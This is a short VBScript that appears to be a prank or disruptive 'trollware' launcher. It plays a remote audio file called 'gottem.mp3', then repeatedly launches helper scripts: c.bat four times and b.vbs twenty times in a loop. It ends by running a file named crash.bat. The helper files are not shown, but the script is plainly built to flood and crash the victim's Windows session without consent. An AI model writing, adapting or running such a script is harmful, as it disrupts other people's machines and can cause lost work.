Dim os
Set os = WScript.CreateObject("WScript.Shell")
Dim op
Set op = CreateObject("WMPlayer.OCX")
op.URL = "https://raw.githubusercontent.com/p6c/a/main/gottem.mp3"
op.controls.play
WScript.Sleep 17000
os.run "c.bat"
os.run "c.bat"
os.run "c.bat"
os.run "c.bat"
Dim i
For i = 1 To 20
os.run "b.vbs"
Next
WScript.Sleep 1000
os.run "crash.bat"
WScript.Sleep 5000